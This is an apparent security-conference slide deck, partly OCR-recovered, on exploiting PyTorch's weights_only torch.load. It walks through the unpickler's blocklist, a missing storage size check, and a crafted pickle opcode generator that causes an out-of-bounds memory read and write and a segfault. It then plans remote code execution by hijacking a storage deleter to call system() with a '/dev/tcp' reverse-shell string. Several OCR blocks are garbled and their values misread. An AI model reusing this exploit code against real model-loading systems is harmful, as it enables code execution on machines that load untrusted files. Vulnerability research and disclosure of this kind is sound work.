*Code is laid out in two columns; the right column continues the left. The `_get_allowed_globals()` / `_get_user_allowed_globals()` branches are boxed in red.*

```python
if key[0] == GLOBAL[0]:
    module, name = _read_global_instruction(self.readline)
    full_path = f"{module}.{name}"
    if module in _blocklisted_modules:
        raise UnpicklingError(
            f"Trying to load unsupported GLOBAL {full_path}
                whose module {module} is blocked."
        )
    if full_path in _get_allowed_globals():
        self.append(_get_allowed_globals()[full_path])
    elif full_path in _get_user_allowed_globals():
        self.append(_get_user_allowed_globals()[full_path])
    elif full_path in (
        [
            "torch.nested._internal.nested_tensor.NestedTensor",
            "torch.nested._internal.nested_tensor._rebuild_njt",
            "torch._dynamo.decorators._DimRange",
        ]
    ):
        raise UnpicklingError("...")
    elif full_path in (
        [
            "torch.distributed.device_mesh.DeviceMesh",
            ...
            "torch.distributed.tensor.placement_types.Shard",
        ]
    ):
        raise UnpicklingError("...")
    else:
        builtins_name = "builtins"
        if (
            builtins_name in full_path
            and builtins_name == full_path[: len(builtins_name)]
        ):
            full_path = full_path[len(builtins_name) :]
            full_path = (
                full_path[1:]
                if len(full_path) > 0 and full_path[0] == "."
                else builtins_name + full_path
            )
        raise UnpicklingError("")
```

49

## Slide 50

### **Simple Test**

```python
import torch
with open("test.txt","w") as f:
    f.write("cos\nsystem\n")
torch.load("test.txt")
```

*Terminal screenshot (clipped on the left and right edges); the last line is boxed in red:*

```text
xuemo>python3 load.py
/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subc…
module named 'numpy' (Triggered internally at /pytorch/torch/csrc/utils/…
  cpu = _conversion_method_template(device=torch.device("cpu"))
Traceback (most recent call last):
  File "/home/xuemo/pytorch-2.8.0/load.py", line 6, in <module>
    torch.load("test.txt")
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we ch…
False` to `True`. Re-running `torch.load` with `weights_only` set to `Fa…
t only if you got the file from a trusted source.
Trying to load unsupported GLOBAL os.system whose module os is blocked.
```

```python
import pickle
print(pickle.loads(b"cos\nsystem\n."))
```

```text
xuemo>python3 load.py
<built-in function system>
```

50

## Slide 51

### **Inspecting Whitelisted Functions**

```python
import torch
import types

for k, v in torch._weights_only_unpickler._get_allowed_globals().items():
    if type(v) is types.FunctionType:
        print(k)
```

##### 😭 Only these "useless" functions

*Terminal screenshot (clipped on the left and right edges):*

```text
xuemo>python3 check.py
/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
module named 'numpy' (Triggered internally at /pytorch/torch/csr…
  cpu = _conversion_method_template(device=torch.device("cpu"))
torch.serialization._get_layout
torch._utils._rebuild_tensor
torch._utils._rebuild_qtensor
torch._utils._rebuild_device_tensor_from_numpy
torch._utils._rebuild_sparse_tensor
torch._utils._rebuild_tensor_v2
torch._utils._rebuild_parameter
torch._utils._rebuild_meta_tensor_no_storage
torch._utils._rebuild_nested_tensor
torch._utils._rebuild_tensor_v3
torch._utils._rebuild_parameter_with_state
torch._utils._rebuild_wrapper_subclass
torch._utils._rebuild_device_tensor_from_cpu_tensor
torch._tensor._rebuild_from_type_v2
```

51

## Slide 52

### **Inspecting Whitelisted Functions**

```python
import torch
import types

for k, v in torch._weights_only_unpickler._get_allowed_globals().items():
    if type(v) is types.FunctionType:
        print(k)
```

##### 🤨 memory bugs?

*Same terminal screenshot as the previous slide (clipped on the left and right edges), with a red box drawn down the `_rebuild` column of the listing:*

```text
xuemo>python3 check.py
/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
module named 'numpy' (Triggered internally at /pytorch/torch/csr…
  cpu = _conversion_method_template(device=torch.device("cpu"))
torch.serialization._get_layout
torch._utils._rebuild_tensor
torch._utils._rebuild_qtensor
torch._utils._rebuild_device_tensor_from_numpy
torch._utils._rebuild_sparse_tensor
torch._utils._rebuild_tensor_v2
torch._utils._rebuild_parameter
torch._utils._rebuild_meta_tensor_no_storage
torch._utils._rebuild_nested_tensor
torch._utils._rebuild_tensor_v3
torch._utils._rebuild_parameter_with_state
torch._utils._rebuild_wrapper_subclass
torch._utils._rebuild_device_tensor_from_cpu_tensor
torch._tensor._rebuild_from_type_v2
```

52

## Slide 53

### **Quick Test**

```python
1  import torch
2
3  storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
4  tensor = torch._utils._rebuild_tensor(
5      storage,
6      storage_offset=0,
7      size=(10,),
8      stride=(1,),
9  )
10 print(tensor)
```

```text
tensor([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
```

```python
1  import torch
2
3  storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
4  tensor = torch._utils._rebuild_tensor(
5      storage,
6      storage_offset=1,
7      size=(10,),
8      stride=(1,),
9  )
10 print(tensor)
```

🤤 "Overflow"?

```text
tensor([          2,        3,       4,
                  5,        6,       7,
                  8,        9,      10,
       3510312154187705889])
```

## Slide 54

🧐 Can we trigger and how to trigger in torch.load?

54

## Slide 55

### **Exploring Model File Format**

```python
1 import torch
2 tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], dtype=torch.long)
3 torch.save(tensor, "tensor.pt")
4 print(torch.load("tensor.pt"))
```

```text
/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/
mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_num
  cpu = _conversion_method_template(device=torch.device("cpu"))
tensor([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
```

```text
(.venv) xuemo>file tensor.pt
tensor.pt: Zip archive data, at least v0.0 to extract, compression method=store
```

## Slide 56

### **Exploring Model File Format**

```text
[xuemo>unzip tensor.pt
Archive:  tensor.pt
 extracting: tensor/data.pkl
 extracting: tensor/.format_version
 extracting: tensor/.storage_alignment
 extracting: tensor/byteorder
 extracting: tensor/data/0
 extracting: tensor/version
 extracting: tensor/.data/serialization_id
```

```python
1 import pickletools
2 with open("tensor/data.pkl","rb") as f:
3     pickletools.dis(f.read())
```

```text
  0: \x80 PROTO      2
  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
 35: q    BINPUT     0
 37: (    MARK
 38: (        MARK
 39: X            BINUNICODE 'storage'
 51: q            BINPUT     1
 53: c            GLOBAL     'torch LongStorage'
 72: q            BINPUT     2
 74: X            BINUNICODE '0'
 80: q            BINPUT     3
 82: X            BINUNICODE 'cpu'
 90: q            BINPUT     4
 92: K            BININT1    10
 94: t            TUPLE      (MARK at 38)
 95: q        BINPUT     5
 97: Q        BINPERSID
 98: K        BININT1    0
100: K        BININT1    10
102: \x85     TUPLE1
103: q        BINPUT     6
105: K        BININT1    1
107: \x85     TUPLE1
108: q        BINPUT     7
110: \x89     NEWFALSE
111: c        GLOBAL     'collections OrderedDict'
136: q        BINPUT     8
138: )        EMPTY_TUPLE
139: R        REDUCE
140: q        BINPUT     9
142: t        TUPLE      (MARK at 37)
143: q    BINPUT     10
145: R    REDUCE
146: q    BINPUT     11
148: .    STOP
```

## Slide 57

### **Equivalent Pseudocode**

```text
  0: \x80 PROTO      2
  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
 35: q    BINPUT     0
 37: (    MARK
 38: (        MARK
 39: X            BINUNICODE 'storage'
 51: q            BINPUT     1
 53: c            GLOBAL     'torch LongStorage'
 72: q            BINPUT     2
 74: X            BINUNICODE '0'
 80: q            BINPUT     3
 82: X            BINUNICODE 'cpu'
 90: q            BINPUT     4
 92: K            BININT1    10
 94: t            TUPLE      (MARK at 38)
 95: q        BINPUT     5
 97: Q        BINPERSID
 98: K        BININT1    0
100: K        BININT1    10
102: \x85     TUPLE1
103: q        BINPUT     6
105: K        BININT1    1
107: \x85     TUPLE1
108: q        BINPUT     7
110: \x89     NEWFALSE
111: c        GLOBAL     'collections OrderedDict'
136: q        BINPUT     8
138: )        EMPTY_TUPLE
139: R        REDUCE
140: q        BINPUT     9
142: t        TUPLE      (MARK at 37)
143: q    BINPUT     10
145: R    REDUCE
146: q    BINPUT     11
148: .    STOP
```

```python
import torch
from collections import OrderedDict
storage = persistent_load(('storage',
                           torch.LongStorage, '0', 'cpu', 10))
result = torch._utils._rebuild_tensor_v2(
    storage,
    0,
    (10,),
    (1,),
    False,
    OrderedDict(),
)
```

*The red box on the disassembly (lines 38–97) corresponds to the red-boxed `storage = persistent_load(...)` in the pseudocode; the blue box (lines 98–145) corresponds to the blue-boxed `result = torch._utils._rebuild_tensor_v2(...)` block.*

## Slide 58

### **Quick Test v2 Function**

😆 "issue" exist too!

```python
import torch
from collections import OrderedDict
storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
tensor = torch._utils._rebuild_tensor_v2(
        storage,
        storage_offset=1,
        size=(10,),
        stride=(1,),
        requires_grad=False,
        backward_hooks=OrderedDict()
    )
print(tensor)
```

```text
tensor([          2,        3,       4,       5,
                  6,        7,       8,       9,
                 10, 134860703830768])
```

## Slide 59

### **Where to Patch?**

```python
import torch
from collections import OrderedDict
storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
tensor = torch._utils._rebuild_tensor_v2(
        storage,
        storage_offset=0,
        size=(10,),
        stride=(1,),
        requires_grad=False,
        backward_hooks=OrderedDict()
    )
print(tensor)
```

```text
  0: \x80 PROTO      2
  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
 35: q    BINPUT     0
 37: (    MARK
 38: (        MARK
 39: X            BINUNICODE 'storage'
 51: q            BINPUT     1
 53: c            GLOBAL     'torch LongStorage'
 72: q            BINPUT     2
 74: X            BINUNICODE '0'
 80: q            BINPUT     3
 82: X            BINUNICODE 'cpu'
 90: q            BINPUT     4
 92: K            BININT1    10
 94: t            TUPLE      (MARK at 38)
 95: q        BINPUT     5
 97: Q        BINPERSID
 98: K        BININT1    0
100: K        BININT1    10
102: \x85     TUPLE1
103: q        BINPUT     6
105: K        BININT1    1
107: \x85     TUPLE1
108: q        BINPUT     7
110: \x89     NEWFALSE
111: c        GLOBAL     'collections OrderedDict'
136: q        BINPUT     8
138: )        EMPTY_TUPLE
139: R        REDUCE
140: q        BINPUT     9
142: t        TUPLE      (MARK at 37)
143: q    BINPUT     10
145: R    REDUCE
146: q    BINPUT     11
148: .    STOP
```

*Numbered arrows map each Python argument to its pickle opcodes: (1, black) `storage_offset=0` → `98: BININT1 0`; (2, red) `size=(10,)` → `100: BININT1 10` / `102: TUPLE1`; (3, blue) `stride=(1,)` → `105: BININT1 1` / `107: TUPLE1`.*

## Slide 60

### **Failed**

**1. Patch & Save**

```python
patch = b'\x80\x02ctorch._utils...'
with open("tensor/data.pkl","wb") as f:
    f.write(patch)
os.system("zip -r tensor.pt tensor/")
```

```text
00000000: 8002 6374 6f72 6368 2e5f 7574 696c 730a  ..ctorch._utils.
00000010: 5f72 6562 7569 6c64 5f74 656e 736f 725f  _rebuild_tensor_
00000020: 7632 0a71 0028 2858 0700 0000 7374 6f72  v2.q.((X....stor
00000030: 6167 6571 0163 746f 7263 680a 4c6f 6e67  ageq.ctorch.Long
00000040: 5374 6f72 6167 650a 7102 5801 0000 0030  Storage.q.X....0
00000050: 7103 5803 0000 0063 7075 7104 4b0a 7471  q.X....cpuq.K.tq
00000060: 0551 4b01 4b0a 8571 064b 0185 7107 8963  .QK.K..q.K..q..c
00000070: 636f 6c6c 6563 7469 6f6e 730a 4f72 6465  collections.Orde
00000080: 7265 6444 6963 740a 7108 2952 7109 7471  redDict.q.)Rq.tq
00000090: 0a52 710b 2e                             .Rq..
```

*The byte `01` at offset `0x60` (in `4b01`) is highlighted with a red box.*

**2. Load**

```python
import torch
torch.load("tensor.pt")
```

😭 Why?

```text
/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subclasses/functional_tensor.py:279: UserWarning: Fail
mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numpy.cpp:81.)
  cpu = _conversion_method_template(device=torch.device("cpu"))
Traceback (most recent call last):
  File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
    torch.load("tensor.pt")
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1521, in load
    return _load(
           ^^^^^^
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 2119, in _load
    result = unpickler.load()
             ^^^^^^^^^^^^^^^^
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_weights_only_unpickler.py", line 409, in load
    result = func(*args)
             ^^^^^^^^^^^
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 225, in _rebuild_tensor_v2
    tensor = _rebuild_tensor(storage, storage_offset, size, stride)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 188, in _rebuild_tensor
    return t.set_(storage._untyped_storage, storage_offset, size, stride)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
RuntimeError: Trying to resize storage that is not resizable
```

*The final `RuntimeError` line is highlighted with a red box.*

## Slide 61

### **Root Cause**

```python
storage = persistent_load(('storage', torch.LongStorage,
                           '0', 'cpu', 10))
result = torch._utils._rebuild_tensor_v2(
    storage,
    1,
    (10,),
    (1,),
    False,
    OrderedDict(),
)
```

```text
1 persistent_load(saved_id) # serialization.py:2065
2      |    └─ load_tensor(dtype=long, nbytes=80, ...) # serialization.py:2002
3      |         └─ zip_file.get_storage_from_record("data/0", 80) # serialization.py:2036
4      |         |
5      |         |   // C++: torch/csrc/jit/python/init.cpp:1624
6      |         └─ c10::Storage(
7      |              size=80,
8      |              data=data_ptr,
9      |              allocator=nullptr,
10     |              resizable=false)          ← *** Key: No resizable ***
```

```text
1  _rebuild_tensor_v2(storage, offset=1, size=(10,), stride=(1,))   # _utils.py:216
2      └─ _rebuild_tensor(storage, 1, (10,), (1,))                   # _utils.py:185
3        └─ t.set_(untyped_storage, 1, (10,), (1,))                  # _utils.py:188
4          └─ set_storage_cpu_(result, storage, 1, [10], [1])        # TensorShape.cpp:376
5            └─ resize_impl_cpu_(impl, [10], [1], resize_storage=true)  # Resize.cpp:229
6              └─ maybe_resize_storage_cpu(self, 88)                 # Resize.h:44
7                 | new_size_bytes: 88
8                 | storage.nbytes(): 80 → Need Resize
9              └─ resize_bytes_cpu(storage, 88)                      # Resize.cpp:93
10               ├─ TORCH_CHECK(storage->resizable(), ...)           # Resize.cpp:94
11               └─ *** RuntimeError: Trying to resize      ***
12                  *** storage that is not resizable       ***
```

*Red boxes highlight `resizable=false)  ← *** Key: No resizable ***` (top tree, line 10); `maybe_resize_storage_cpu(self, 88)` through `storage.nbytes(): 80 → Need Resize` (bottom tree, lines 6–8); and `TORCH_CHECK(...)` through `storage that is not resizable` (bottom tree, lines 10–12).*

## Slide 62

### **False Positive**

```python
storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
tensor = torch._utils._rebuild_tensor_v2(
        storage,
        storage_offset=1,
        size=(10,),
        stride=(1,),
        requires_grad=False,
        backward_hooks=OrderedDict()
    )
```

```text
1  torch.LongStorage([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])
2      └─ _LegacyStorage.__new__()                                  # storage.py:748
3        └─ TypedStorage.__init__([1..10], dtype=long, device=cpu)  # storage.py:839
4          └─ _get_storage_from_sequence([1..10], long, cpu)        # storage.py:594
5            └─ torch.tensor([1..10], dtype=long, device=cpu)       # storage.py:614
6              └─ _empty_generic(size=[10], CPUAllocator)           # EmptyTensor.cpp:177
7                └─ StorageImpl(                                    # EmptyTensor.cpp:187
8                     size=80,
9                     allocator=CPUAllocator,
10                    resizable=true)
```

*The `resizable=true)` line (10) is highlighted with a red box.*

```cpp
void resize_bytes_cpu(StorageImpl* storage, size_t size_bytes) {
  TORCH_CHECK(storage->resizable(), "Trying to resize storage that is not resizable");

  at::DataPtr new_data;
  if (size_bytes != 0) {
    new_data = storage->allocator()->allocate(size_bytes);
  }
  const at::DataPtr& old_data = storage->data_ptr();
  const auto old_capacity = storage->nbytes();
  const auto copy_capacity = std::min(size_bytes, old_capacity);
  if (old_data != nullptr && copy_capacity > 0) {
    memcpy(new_data.get(), old_data.get(), copy_capacity);
  }
  storage->set_data_ptr_noswap(std::move(new_data));
  storage->set_nbytes(size_bytes);
}
```

*The `new_data = storage->allocator()->allocate(size_bytes);` line is highlighted with a red box.*

## Slide 63

### **First Attempt Failed**

```text
  0: \x80 PROTO      2
  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
 35: q    BINPUT     0
 37: (    MARK
 38: (        MARK
 39: X            BINUNICODE 'storage'
 51: q            BINPUT     1
 53: c            GLOBAL     'torch LongStorage'
 72: q            BINPUT     2
 74: X            BINUNICODE '0'
 80: q            BINPUT     3
 82: X            BINUNICODE 'cpu'
 90: q            BINPUT     4
 92: K            BININT1    10
 94: t            TUPLE      (MARK at 38)
 95: q        BINPUT     5
 97: Q        BINPERSID
 98: K        BININT1    0
100: K        BININT1    10
102: \x85     TUPLE1
103: q        BINPUT     6
105: K        BININT1    1
107: \x85     TUPLE1
108: q        BINPUT     7
110: \x89     NEWFALSE
111: c        GLOBAL     'collections OrderedDict'
136: q        BINPUT     8
138: )        EMPTY_TUPLE
139: R        REDUCE
140: q        BINPUT     9
142: t        TUPLE      (MARK at 37)
143: q    BINPUT     10
145: R    REDUCE
146: q    BINPUT     11
148: .    STOP
```

```python
import torch
from collections import OrderedDict
storage = persistent_load(('storage',
                           torch.LongStorage, '0', 'cpu', 10))
result = torch._utils._rebuild_tensor_v2(
    storage,
    0,
    (10,),
    (1,),
    False,
    OrderedDict(),
)
```

😢 Not vulnerable

*A red box surrounds disassembly lines 98–145 and, on the right, the `result = torch._utils._rebuild_tensor_v2(...)` block.*

## Slide 64

### **First Attempt Failed**

🤔 What about this part?

```text
  0: \x80 PROTO      2
  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
 35: q    BINPUT     0
 37: (    MARK
 38: (        MARK
 39: X            BINUNICODE 'storage'
 51: q            BINPUT     1
 53: c            GLOBAL     'torch LongStorage'
 72: q            BINPUT     2
 74: X            BINUNICODE '0'
 80: q            BINPUT     3
 82: X            BINUNICODE 'cpu'
 90: q            BINPUT     4
 92: K            BININT1    10
 94: t            TUPLE      (MARK at 38)
 95: q        BINPUT     5
 97: Q        BINPERSID
 98: K        BININT1    0
100: K        BININT1    10
102: \x85     TUPLE1
103: q        BINPUT     6
105: K        BININT1    1
107: \x85     TUPLE1
108: q        BINPUT     7
110: \x89     NEWFALSE
111: c        GLOBAL     'collections OrderedDict'
136: q        BINPUT     8
138: )        EMPTY_TUPLE
139: R        REDUCE
140: q        BINPUT     9
142: t        TUPLE      (MARK at 37)
143: q    BINPUT     10
145: R    REDUCE
146: q    BINPUT     11
148: .    STOP
```

```python
import torch
from collections import OrderedDict
storage = persistent_load(('storage',
                           torch.LongStorage, '0', 'cpu', 10))
result = torch._utils._rebuild_tensor_v2(
    storage,
    0,
    (10,),
    (1,),
    False,
    OrderedDict(),
)
```

*A red box surrounds disassembly lines 38–97 and, on the right, the two `storage = persistent_load((...))` lines.*

## Slide 65

### **A Quick Look at persistent_load**

```python
import torch
from collections import OrderedDict
storage = persistent_load(('storage',
                           torch.LongStorage, '0', 'cpu', 10))
result = torch._utils._rebuild_tensor_v2(
    storage,
    0,
    (10,),
    (1,),
    False,
    OrderedDict(),
)
```

```text
[(.venv) xuemo>xxd tensor/data/0
00000000: 0100 0000 0000 0000 0200 0000 0000 0000
00000010: 0300 0000 0000 0000 0400 0000 0000 0000
00000020: 0500 0000 0000 0000 0600 0000 0000 0000
00000030: 0700 0000 0000 0000 0800 0000 0000 0000
00000040: 0900 0000 0000 0000 0a00 0000 0000 0000
```

```python
def persistent_load(saved_id):
    assert isinstance(saved_id, tuple)
    typename = _maybe_decode_ascii(saved_id[0])
    data = saved_id[1:]
    assert typename == "storage", (
        f"Unknown typename for persistent_load,
            expected 'storage' but got '{typename}'"
    )
    storage_type, key, location, numel = data
    dtype = storage_type.dtype
    nbytes = numel * torch._utils._element_size(dtype)
    typed_storage = load_tensor(
        dtype, nbytes, key,
                _maybe_decode_ascii(location)
    )
    return typed_storage
```

*Two arrows link the definition to its inputs: a red arrow connects `numel = data` to the `10` in `torch.LongStorage, '0', 'cpu', 10))`; a blue arrow connects the `'0'` key to the `xxd tensor/data/0` dump below.*

## Slide 66

### **Try Again**

😱 Overflow

66


> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
“Try Again
storage = persistent_load(('storage',
patch = b' \x80\x@2ctorch »_utils waa torch. LongSto rage, 'Q' , ' cpu ' , 10) )
with open("tensor/data.pkl","wb") as f: |
f.write(patch)
os.system("zip —r tensor.pt tensor/") storage = persistent_load(('storage',
torch.LongStorage, '@', 'cpu', 20))
=] 1
def load_tensor(dtype, numel, key, location): & storage = {UntypedStorage: 160}| 1\n 0\n 2
name = f"data/{key}" a > §& device = {device} device(type='cpu') :
sas a2 filename = {Nonelype} None 5
storage = ( 82 is_cuda = {bool} False ;
zip_file.get_storage_from_record(name, 8 62 Overflow
numel, torch.UntypedStorage) *o
._typed_storage() 256
977
»_untyped_storage 659411806
) 7194841895290213545,
931
pas -1
S typed_storage = {TypedStorage: 20} 1\n 2\n 4423776321828644210
> S& device = {device} device(type='cpu') 3688834454662362930
dtype=dtype,
_internal=True,
> =| dtype = {dtype} torch.int64 [torch.storage.TypedStorage(dtype=torch.int64, device=cpu) of size 20]
66
```

## Slide 67

### **Why?**

67


> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
storage = (
zip_file.get_storage_from_record(name, numel,
torch.UntypedStorage)
storage = persistent_load(('storage',
torch.LongStorage, ‘'@', ‘cpu', 20))
._typed_storage()
._untyped_storage)
.def("get_st
orage_from_record"
(PyTorchStreamReader& self,
size_t numel,
py::object data_type_obj) {
[(.venv) xuemo>xxd tensor/data/®
at::DataPtr data(std::get<@>(self.getRecord(key))); @0000010: 63 04
//Missing Size Check!!! 00000030: 07 es
c10::Storage storage(
c1@::Storage::use_byte_size_t(),
numel * elementSize(scalar_type),
/*resizable=*/false);
})
00000040:
67
```

## Slide 68

### **Full Attack Flow**

###### 1. Prepare base model

3.  Patch & Save

###### 2. Evil pickle opcode

68


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Full Attack Flow
1. Prepare base model
import os
from pickle import x
from struct import pack
2. Evil pickle opcode
def generate_overflow_tensor_pid( length, pid):
poc = GLOBAL+b"torch._utils\n_rebuild_tensor_v2\n"
A poc += MARK
import torch
tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], poc += MARK
dtype=torch. long) poc += BINUNICODE+b"\x07\x00\x00\x00"+b"storage"
torch.save(tensor, "tensor.pt") poc += GLOBAL+b"torch\nLongStorage\n"
os.system("rm -rf tensor") poc += BININT+pack("<i", pid)
os.system("unzip tensor.pt") poc += BINUNICODE+b"\x@3\x00\x00\x00"+b" cpu"
poc += BININT+pack("<i", length) # Bug here!!
poc += TUPLE+BINPERSID
poc += BININT1+b"\x@0" #storage_offset
poc += BININT + pack("<i", length)+TUPLE1 #size
poc += BININT1+b"\x@1"+TUPLE1 #stride
3. Patch & Save poc += NEWFALSE
poc = generate_overflow_tensor_pid(0x20,Q) poc += GLOBAL+bcollections\nOrderedDict\n"
poc += STOP poc += EMPTY_TUPLE
, = NEWOBJ
with open("tensor/data.pkl","wb") as f: oe TUPLE
f.write(poc) P
a) 7 poc+=REDUCE
os.system("zip -r tensor.pt tensor/") return poc
68
```

## Slide 69

### **Full Attack Flow**

###### 4.  Load & Trigger

###### Overflow

69

## Slide 70

🧐 Can we turn this memory vulnerability into RCE?

70

## Slide 71

### **SETITEM & SETITEMS**

🤩 We can fully control the index and the value

71


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"SETITEM & SETITEMS
(v, k) = (self.stack.pop(), self.stack.pop() )
self.stack[-1] [k] = v
elif key[0] == SETITEMS[@]:
items = self.pop_mark()
for i in range(@, len(items), 2):
self.stack[-1] [items[i]] = items[i + 1]
© We can fully control the index and the value
1. Stack Before Execution 2. VM Execution 3. Stack After
Top (Popped First)
v = Oxaaaa
v = stack.pop()
) > # gets Oxaaaa
Middle (Popped Second) k = stack.pop() b New Top (Updated Object)
k=1 Pe # gets 1 mp_tensor = [1, @Oxaaaa, 3, 4]
stack[-1][k] = v
ota > # tmp_tensor[1]=Oxaaaa
Bottom (Target Object) |_u--
```

## Slide 72

### **Have a Try!**

72


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Have a Try!
overflow_length = 256
poc = generate_overflow_tensor_pid(overflow_length, 0)
for i in range(overflow_length) :
poc += MARK
poc += BININT + pack("<i", i)
poc+=SETITEMS
poc += STOP
with open("tensor/data.pkl","wb") as f:
f.write(poc)
os.system("zip -r tensor.pt tensor/")
import torch
torch. load("tensor.pt")
xuemo>python3 load.py
/home/xuemo/pytorch-2.8.0/.venv/lib
module named 'numpy' (Triggered int
cpu = _conversion_method_template
Segmentation fault (core dumped)
72
```

## Slide 73

### **Memory Structure**

73


> Recovered by OCR — confidence 81/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Memory Structure
c10::Storagelmp! (Memory Layout)
Address’ slot[0] slot[1]
Cleanup / Destructor Logic
: deleter_(ctx_.ptr);
0x10 data_ptr_.ptr_.data_ ® data_ptr_.ptr_.ctx_.deleter o--- Pp:
! .
1
1
1
1
storage_
// data_ == ctx_.ptr
0x30 size_bytes_ [next fields omitted]
1
Target Real Memory (Data)
73
```

## Slide 74

### **A Simple Way to Achieve RCE**

74


> Recovered by OCR — confidence 70/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“A Simple Way to Achieve RCE
c10::Storagelmp! (Corrupted Memory Layout)
of0:;Tensorimp! Address slot[0] slot[1] Hijacked Destructor Logic
storage_ 0 vptr refcount_ + weakcount_ i. ie: '
0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e@-- -> system (eee pt r) :
L 0x30 size_bytes_ [next™ fields omitted] J
Target Real Memory overwritten Payload)
"bash -i >&/dev/tcp/ip/port 0>&1\0"
74
```

## Slide 75

### **A Simple Way to Achieve RCE**

😢 How can we leak?

75


> Recovered by OCR — confidence 74/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“A Simple Way to Achieve RCE
& How can we leak?
c10::Storagelmp! (Corrupted Memory Layout)
elec Address | stotlel stot(1] Hijacked Destructor Logic
storage_ 0 vptr refcount_ + weakcount_ r
0x10 data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter o-- -p system (eee pt r) F
L 0x30 size_bytes_ [next™ fields omitted] J
Target Real Memory overwritten Payload)
"bash -i >&/dev/tcp/ip/port 0>&1\0"
75
```

## Slide 76

### **All Supported Opcodes**

😭

No opcode for leak

76


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“All Supported Opcodes
APPEND,
APPENDS,
BINFLOAT,
BINGET,
BININT,
BININT1,
BININT2,
BINPERSID,
BINPUT,
BINUNICODE,
BUILD,
EMPTY_DICT,
EMPTY_LIST,
EMPTY_SET,
EMPTY_TUPLE,
GLOBAL,
LONG1,
No opcode for leak
LONG_BINGET,
LONG_BINPUT,
MARK,
NEWFALSE,
NEWOBJ,
NEWTRUE,
NONE,
PROTO,
REDUCE,
SETITEM,
SETITEMS,
SHORT_BINSTRING,
STOP,
TUPLE,
TUPLE1,
TUPLE2,
TUPLE3,
```

## Slide 77

77

## Slide 78

### **An Accidental Discovery**

🤣 No PIE! 🤔 But why?

78

## Slide 79

### 🤣 **Amazing Feature**

79

https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
% Amazing Feature
Python Interpreter / python3 / Repository
68 dpkg_buildflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
70 |ifeq (,$(filter $(distrelease),stretch buster bullseye trusty xenial bionic focal impish) )
71 with_nopie := yes
72 dpkg_pieflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
73 endif
Python Interpreter / python3 / Repository
1412 ifeq ($(with_nopie) , yes)
© 1413 dh_installdirs -p$(p_npie) \
1414 usr/bin
1415 cp -p $(buildd_nopie)/python $(d_npie)/usr/bin/$(PVER)
1416 endif
1 p_npie := $(PVER)-nopie
2 VER=3.15
3 PVER=python$(VER)
79
https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules
```

## Slide 80

##### 😄 We have system address!

80


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a
c10::Tensorlmpl
storage_
Address
0x10
0x20
0x30
© We have system address!
c10::Storagelmp! (Corrupted Memory Layout)
slot[0] slot[1]
vptr refcount_ + weakcount_
